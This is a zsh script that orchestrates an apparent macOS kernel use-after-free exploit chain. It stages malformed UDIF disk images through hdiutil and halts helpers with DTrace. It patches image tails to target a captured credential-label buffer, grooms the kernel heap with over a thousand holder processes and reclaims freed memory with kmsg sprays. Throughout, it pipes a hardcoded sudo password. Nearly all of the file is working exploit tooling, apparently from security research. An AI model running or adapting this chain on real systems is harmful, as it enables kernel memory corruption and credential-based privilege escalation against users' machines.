#!/bin/zsh

set -u

if (( $# < 1 || $# > 3 )); then
    print -u2 "usage: $0 run_name [safe_helper_count] [actual_helper_count]"
    exit 64
fi

run_name=$1
safe_count=${2:-48}
actual_count=${3:-20}
if [[ ! $safe_count =~ '^[1-9][0-9]*$' ]] || (( safe_count > 128 )); then
    print -u2 "safe_helper_count must be in 1..128"
    exit 64
fi
if [[ ! $actual_count =~ '^[1-9][0-9]*$' ]] || (( actual_count > 32 )); then
    print -u2 "actual_helper_count must be in 1..32"
    exit 64
fi

home=/Users/testtest
seed=$home/seedz_xml_compact680_blkx1_zero_26A5388g.dmg
label_trace=$home/trace_credlabel_allocafter_valid_free.d
pair_trace=$home/trace_credlabel_buffer_pointer.d
stop_trace=$home/stop_diskimages_helper_after_image_read.d
zero_patcher=$home/patch_validated_udif_bounded_wrap.py
tail_patcher=$home/patch_udif_tail_source.py
chain_watcher=$home/chain_tail32_holegroom.py
donor_launcher=$home/launch_asp_sleep_group.sh
holder_launcher=$home/launch_asp_sleep_group.sh
kmsg_reclaim=$home/kmsg_reclaim

base=$home/$run_name
label_log=${base}.labels.log
pair_log=${base}.donor.trace.log
summary=${base}.summary.log
manifest=${base}.safe.manifest
actual_manifest=${base}.actual.manifest
reclaim_pidfile=${base}.reclaim.pids
reclaim_log_dir=${base}.reclaim.logs
start_file=${base}.chain.start
boot=$(/usr/sbin/sysctl -n kern.bootsessionuuid)

donor_parent=0
donor_child=0
donor_object=0
donor_buffer=0
label_pid=0
holder_parent=0
holder_parent_extra=0
second_holder_parent=0
second_holder_parent_extra=0
target_fired=0
cleanup_enabled=1
staged_helper=0
staged_attach=0
staged_cpu=-1
chain_pid=0
typeset -a safe_helpers
typeset -a safe_attaches
typeset -a actual_helpers
typeset -a actual_attaches
typeset -a actual_works

log() {
    print -r -- "$*" | /usr/bin/tee -a "$summary"
}

pid_alive() {
    (( $1 > 0 )) && /bin/kill -0 "$1" 2>/dev/null
}

stop_root_pid() {
    local process_id=$1
    if pid_alive "$process_id"; then
        print 'test' | /usr/bin/sudo -S /bin/kill -TERM "$process_id" >/dev/null 2>&1 || true
    fi
}

stop_holder_tree() {
    local parent=$1
    local pidfile=$2
    if [[ -f "$pidfile" ]]; then
        while IFS= read -r process_id; do
            if [[ "$process_id" =~ '^[1-9][0-9]*$' ]]; then
                /bin/kill -TERM "$process_id" 2>/dev/null || true
            fi
        done < "$pidfile"
    fi
    if pid_alive "$parent"; then
        /bin/kill -TERM "$parent" 2>/dev/null || true
    fi
}

wait_for_pattern() {
    local file=$1
    local pattern=$2
    local attempts=$3
    local delay=$4
    local index
    for ((index = 1; index <= attempts; index++)); do
        if /usr/bin/grep -q -- "$pattern" "$file" 2>/dev/null; then
            return 0
        fi
        /bin/sleep "$delay"
    done
    return 1
}

wait_for_exit() {
    local process_id=$1
    local attempts=$2
    local delay=$3
    local index
    for ((index = 1; index <= attempts; index++)); do
        if ! pid_alive "$process_id"; then
            return 0
        fi
        /bin/sleep "$delay"
    done
    return 1
}

disarm_actuals() {
    local index process_id attach_id work
    for ((index = 1; index <= ${#actual_helpers}; index++)); do
        process_id=${actual_helpers[$index]}
        work=${actual_works[$index]}
        if pid_alive "$process_id"; then
            /usr/bin/python3 "$zero_patcher" "$work" 0xc7b >> "$summary" 2>&1 || true
        fi
    done
    /bin/sync
    for ((index = 1; index <= ${#actual_helpers}; index++)); do
        process_id=${actual_helpers[$index]}
        attach_id=${actual_attaches[$index]}
        if pid_alive "$process_id"; then
            print 'test' | /usr/bin/sudo -S /bin/kill -CONT "$process_id" >/dev/null 2>&1 || true
        fi
        if (( attach_id > 0 )); then
            wait_for_exit "$attach_id" 100 0.1 || true
        fi
    done
}

release_safe_helpers() {
    local process_id attach_id
    for process_id in $safe_helpers; do
        if pid_alive "$process_id"; then
            print 'test' | /usr/bin/sudo -S /bin/kill -CONT "$process_id" >/dev/null 2>&1 || true
        fi
    done
    for attach_id in $safe_attaches; do
        if pid_alive "$attach_id"; then
            /bin/kill -TERM "$attach_id" 2>/dev/null || true
        fi
    done
}

cleanup() {
    local exit_code=$?
    if (( cleanup_enabled )); then
        stop_root_pid "$chain_pid"
        stop_holder_tree 0 "$reclaim_pidfile"
        disarm_actuals
        release_safe_helpers
        stop_holder_tree "$second_holder_parent_extra" "${base}.second.b.partial.pids"
        stop_holder_tree "$second_holder_parent" "${base}.second.a.partial.pids"
        stop_holder_tree "$holder_parent_extra" "${base}.holders.b.partial.pids"
        stop_holder_tree "$holder_parent" "${base}.holders.a.partial.pids"
        if pid_alive "$donor_child"; then
            /bin/kill -TERM "$donor_child" 2>/dev/null || true
        fi
        if pid_alive "$donor_parent"; then
            /bin/kill -TERM "$donor_parent" 2>/dev/null || true
        fi
        stop_root_pid "$label_pid"
    fi
    /bin/sync
    log "CLEANUP status=$exit_code target_fired=$target_fired cleanup_enabled=$cleanup_enabled boot=$boot"
}

stage_attach() {
    local stage_base=$1
    local work=$2
    local stop_log=${stage_base}.stop.log
    local attach_log=${stage_base}.attach.log
    local stop_pid attach_pid helper_pid stop_line stop_cpu

    staged_helper=0
    staged_attach=0
    staged_cpu=-1

    /bin/cp -f "$seed" "$work"
    /bin/rm -f "$stop_log" "$attach_log"
    print 'test' | /usr/bin/sudo -S -v >/dev/null || return 1
    nohup /usr/bin/sudo -n /usr/sbin/dtrace -w -q -s "$stop_trace" 0x77f \
        > "$stop_log" 2>&1 < /dev/null &
    stop_pid=$!
    if ! wait_for_pattern "$stop_log" TRACE_BEGIN 200 0.05; then
        log "STOP_TRACE_NOT_READY base=$stage_base stop_pid=$stop_pid"
        stop_root_pid "$stop_pid"
        return 1
    fi
    nohup /usr/bin/hdiutil attach -nomount -readonly -kernel -noverify "$work" \
        > "$attach_log" 2>&1 < /dev/null &
    attach_pid=$!
    if ! wait_for_pattern "$stop_log" stopped_helper_pid 200 0.05; then
        log "STAGE_FAILED base=$stage_base stop_pid=$stop_pid attach_pid=$attach_pid"
        stop_root_pid "$stop_pid"
        /bin/kill -TERM "$attach_pid" 2>/dev/null || true
        return 1
    fi
    stop_line=$(/usr/bin/grep 'stopped_helper_pid=' "$stop_log" | /usr/bin/tail -1)
    helper_pid=$(print -r -- "$stop_line" | /usr/bin/sed -nE 's/.*stopped_helper_pid=([0-9]+).*/\1/p')
    stop_cpu=$(print -r -- "$stop_line" | /usr/bin/sed -nE 's/.*cpu=([0-9]+).*/\1/p')
    if [[ -z "$helper_pid" || -z "$stop_cpu" ]] || ! pid_alive "$helper_pid"; then
        log "STAGED_HELPER_NOT_READY base=$stage_base helper=${helper_pid:-none} cpu=${stop_cpu:-none}"
        /bin/kill -TERM "$attach_pid" 2>/dev/null || true
        return 1
    fi
    staged_helper=$helper_pid
    staged_attach=$attach_pid
    staged_cpu=$stop_cpu
}

trap cleanup EXIT
trap 'exit 130' HUP INT TERM

: > "$summary"
log "RUN_BEGIN name=$run_name boot=$boot strategy=prestaged-adjacent-hole safe_count=$safe_count"
print 'test' | /usr/bin/sudo -S -v >/dev/null || exit 1

for required in "$seed" "$label_trace" "$pair_trace" "$stop_trace" \
    "$zero_patcher" "$tail_patcher" "$chain_watcher" "$donor_launcher" \
    "$holder_launcher" "$kmsg_reclaim"; do
    if [[ ! -f "$required" ]]; then
        log "MISSING_REQUIRED path=$required"
        exit 1
    fi
done

# A direct shebang exec is required; explicitly invoking zsh bypasses the
# script-vnode credential path that allocates the fresh ASP pair.
/bin/rm -f "$pair_log" "${base}.donor.pids" "${base}.donor.launch.log"
nohup /usr/bin/sudo -n /usr/sbin/dtrace -q -s "$pair_trace" \
    > "$pair_log" 2>&1 < /dev/null &
pair_pid=$!
if ! wait_for_pattern "$pair_log" TRACE_BEGIN 200 0.05; then
    log "DONOR_TRACE_NOT_READY pid=$pair_pid"
    stop_root_pid "$pair_pid"
    exit 1
fi
nohup "$donor_launcher" 1 1800 "${base}.donor.pids" \
    > "${base}.donor.launch.log" 2>&1 < /dev/null &
donor_parent=$!
for attempt in {1..200}; do
    if [[ -s "${base}.donor.pids" ]]; then
        donor_child=$(/usr/bin/head -1 "${base}.donor.pids")
        if /usr/bin/grep -q "pid=${donor_child} " "$pair_log" 2>/dev/null; then
            break
        fi
    fi
    /bin/sleep 0.05
done
stop_root_pid "$pair_pid"
/bin/sleep 0.1
if (( donor_child == 0 )) || ! pid_alive "$donor_child"; then
    log "DONOR_CHILD_NOT_READY parent=$donor_parent child=$donor_child"
    exit 1
fi
donor_line=$(/usr/bin/grep " CRED_PAIR .* pid=${donor_child} " "$pair_log" | /usr/bin/tail -1)
if [[ -z "$donor_line" ]]; then
    log "DONOR_PAIR_NOT_CAPTURED parent=$donor_parent child=$donor_child"
    exit 1
fi
donor_object=$(print -r -- "$donor_line" | /usr/bin/sed -E 's/.* object=(0x[0-9a-f]+).*/\1/')
donor_buffer=$(print -r -- "$donor_line" | /usr/bin/sed -E 's/.* buffer=(0x[0-9a-f]+).*/\1/')
if [[ "$donor_object" == 0x0 || "$donor_buffer" == 0x0 ]]; then
    log "DONOR_PAIR_INVALID line=$donor_line"
    exit 1
fi
log "DONOR_READY object=$donor_object buffer=$donor_buffer parent=$donor_parent child=$donor_child"

/bin/rm -f "$label_log"
nohup /usr/bin/sudo -n /usr/sbin/dtrace -w -q -s "$label_trace" "$donor_buffer" \
    > "$label_log" 2>&1 < /dev/null &
label_pid=$!
if ! wait_for_pattern "$label_log" TRACE_BEGIN 100 0.05; then
    log "LABEL_TRACE_NOT_READY pid=$label_pid"
    exit 1
fi
log "LABEL_TRACE_READY pid=$label_pid target=$donor_buffer"

: > "$manifest"
for ((iteration = 1; iteration <= safe_count; iteration++)); do
    safe_base=${base}.safe.${iteration}
    safe_work=${safe_base}.work.dmg
    stage_attach "$safe_base" "$safe_work" || exit 1
    safe_helpers+=($staged_helper)
    safe_attaches+=($staged_attach)
    /usr/bin/python3 "$zero_patcher" "$safe_work" 0xc7b \
        > "${safe_base}.patch.log" 2>&1 || exit 1
    print -r -- "index=$iteration helper=$staged_helper attach=$staged_attach stop_cpu=$staged_cpu work=$safe_work" >> "$manifest"
    if (( iteration % 8 == 0 )); then
        log "SAFE_PRESTAGE_PROGRESS iteration=$iteration helper=$staged_helper stop_cpu=$staged_cpu"
    fi
done
log "SAFE_POOL_READY count=$safe_count manifest=$manifest"

# Stage malformed helpers last so none expire while the safe pool is built.
# Strict watcher mode resumes at most one CPU-matching member per boot.
: > "$actual_manifest"
for ((actual_candidate = 1; actual_candidate <= actual_count; actual_candidate++)); do
    actual_base=${base}.actual.${actual_candidate}
    actual_work=${actual_base}.work.dmg
    stage_attach "$actual_base" "$actual_work" || exit 1
    actual_helpers+=($staged_helper)
    actual_attaches+=($staged_attach)
    actual_works+=($actual_work)
    /usr/bin/python3 "$tail_patcher" "$actual_work" \
        --copy-span 0x20 --pattern-offset 0x10 \
        --qword0 0 --qword1 "$donor_buffer" --arm-wrap \
        > "${actual_base}.patch.log" 2>&1 || exit 1
    print -r -- "cpu=$staged_cpu helper=$staged_helper attach=$staged_attach work=$actual_work" >> "$actual_manifest"
    log "ACTUAL_POOL_MEMBER cpu=$staged_cpu helper=$staged_helper attach=$staged_attach candidate=$actual_candidate donor=$donor_buffer"
done
log "ACTUAL_POOL_READY count=${#actual_helpers} manifest=$actual_manifest"

/usr/bin/shasum -a 256 "$seed" $actual_works "$tail_patcher" "$label_trace" \
    "$zero_patcher" "$chain_watcher" "$stop_trace" "$kmsg_reclaim" \
    "$donor_launcher" "$holder_launcher" "$0" \
    > "${base}.inputs.sha256"
{
    print -r -- "boot=$boot strategy=prestaged-adjacent-hole"
    print -r -- "donor_object=$donor_object donor_buffer=$donor_buffer donor_parent=$donor_parent donor_child=$donor_child"
    print -r -- "actual_pool_count=${#actual_helpers} actual_manifest=$actual_manifest"
    print -r -- "safe_count=$safe_count source_offset=0xc5b copy_span=0x20 pattern_offset=0xc6b neighbor_delta=0x10"
    /bin/cat "$actual_manifest"
    /bin/cat "$manifest"
    /bin/cat "${base}.inputs.sha256"
} > "${base}.preflight.log"
/bin/sync

# Start the watcher before the final holder fill. It blocks on a shell-created
# file, so its startup allocations are also consumed by the two live groups.
/bin/rm -f "$start_file" \
    "${base}.holders.pids" "${base}.second.pids" \
    "${base}.holders.a.pids" "${base}.holders.b.pids" \
    "${base}.second.a.pids" "${base}.second.b.pids" \
    "${base}.holders.a.partial.pids" "${base}.holders.b.partial.pids" \
    "${base}.second.a.partial.pids" "${base}.second.b.partial.pids"
print 'test' | /usr/bin/sudo -S -v >/dev/null || exit 1
nohup /usr/bin/sudo -n /usr/bin/python3 "$chain_watcher" \
    "$label_log" "$manifest" "$actual_manifest" "$donor_parent" "$donor_child" \
    --donor-object "$donor_object" --donor-buffer "$donor_buffer" \
    --holder-group "${base}.holders.pids:0" \
    --holder-group "${base}.second.pids:0" \
    --max-holes 256 --min-open-holes 48 --start-open-holes 56 --hole-timeout 30 \
    --safe-timeout 8 --target-timeout 90 --free-settle-ms 0 \
    --require-staged-cpu-match --candidate-cpu-warmup 1 \
    --max-actual-attempts 4 \
    --reclaim-helper "$kmsg_reclaim" --reclaim-pidfile "$reclaim_pidfile" \
    --reclaim-log-dir "$reclaim_log_dir" --reclaim-home "$home" \
    --reclaim-count 256 --reclaim-size 0x3d4 --reclaim-uid 501 --reclaim-gid 20 \
    --reclaim-ready-timeout 2 --reclaim-trace-settle-ms 10 \
    --repeat-free-timeout 120 --post-chain-seconds 20 \
    --start-file "$start_file" --start-timeout 120 \
    > "${base}.chain.log" 2>&1 < /dev/null &
chain_pid=$!
if ! wait_for_pattern "${base}.chain.log" \
    "KMSG_RECLAIM_PRESTAGE_READY count=256" 1200 0.05; then
    log "KMSG_RECLAIM_PRESTAGE_NOT_READY chain_pid=$chain_pid"
    exit 1
fi
log "KMSG_RECLAIM_PRESTAGED count=256 chain_pid=$chain_pid"

# Final-fill the shared 16-byte zone only after every helper and watcher exists.
# Two 432-job launchers per logical group leave room for reclaim holders.
nohup "$holder_launcher" 432 1800 "${base}.holders.a.pids" \
    "${base}.holders.a.partial.pids" \
    > "${base}.holders.a.log" 2>&1 < /dev/null &
holder_parent=$!
nohup "$holder_launcher" 432 1800 "${base}.holders.b.pids" \
    "${base}.holders.b.partial.pids" \
    > "${base}.holders.b.log" 2>&1 < /dev/null &
holder_parent_extra=$!
nohup "$holder_launcher" 432 1800 "${base}.second.a.pids" \
    "${base}.second.a.partial.pids" \
    > "${base}.second.a.log" 2>&1 < /dev/null &
second_holder_parent=$!
nohup "$holder_launcher" 432 1800 "${base}.second.b.pids" \
    "${base}.second.b.partial.pids" \
    > "${base}.second.b.log" 2>&1 < /dev/null &
second_holder_parent_extra=$!
holder_deadline=$((SECONDS + 30))
while [[ ! -s "${base}.holders.a.pids" || ! -s "${base}.holders.b.pids" ||
    ! -s "${base}.second.a.pids" || ! -s "${base}.second.b.pids" ]]; do
    if (( SECONDS >= holder_deadline )); then
        log "HOLDER_GROUP_NOT_READY first_parent=$holder_parent first_extra=$holder_parent_extra second_parent=$second_holder_parent second_extra=$second_holder_parent_extra"
        exit 1
    fi
done
: > "${base}.holders.pids"
while IFS= read -r process_id; do
    print -r -- "$process_id" >> "${base}.holders.pids"
done < "${base}.holders.a.pids"
while IFS= read -r process_id; do
    print -r -- "$process_id" >> "${base}.holders.pids"
done < "${base}.holders.b.pids"
: > "${base}.second.pids"
while IFS= read -r process_id; do
    print -r -- "$process_id" >> "${base}.second.pids"
done < "${base}.second.a.pids"
while IFS= read -r process_id; do
    print -r -- "$process_id" >> "${base}.second.pids"
done < "${base}.second.b.pids"
print -r -- "HOLDERS_READY first_parent=$holder_parent first_extra=$holder_parent_extra second_parent=$second_holder_parent second_extra=$second_holder_parent_extra total=1728 hold=1800" >> "$summary"

# A shell builtin releases the watcher without introducing another process.
: > "$start_file"
wait "$chain_pid"
chain_status=$?
chain_pid=0
/bin/sync
/bin/cat "${base}.chain.log" >> "${base}.preflight.log" 2>/dev/null || true

if /usr/bin/grep -Eq 'UAF_KMSG_(CROSS_MESSAGE_SUBSTITUTION|POST_FREE_USE)_CONFIRMED' "${base}.chain.log" 2>/dev/null; then
    target_fired=1
    log "KMSG_UAF_CHAIN_CONFIRMED watcher_status=$chain_status"
    exit 0
fi
if /usr/bin/grep -q KMSG_RECLAIM_EXHAUSTED "${base}.chain.log" 2>/dev/null; then
    log "KMSG_RECLAIM_EXHAUSTED watcher_status=$chain_status"
    exit 13
fi
if /usr/bin/grep -q RECYCLE_MISS "${base}.chain.log" 2>/dev/null; then
    log "RECYCLE_MISS_CHAIN watcher_status=$chain_status"
    exit 3
fi
if /usr/bin/grep -q NO_PLANNED_HOLE_HIT "${base}.chain.log" 2>/dev/null; then
    log "NO_PLANNED_HOLE_HIT watcher_status=$chain_status"
    exit 2
fi
log "CHAIN_INCOMPLETE watcher_status=$chain_status"
exit "$chain_status"
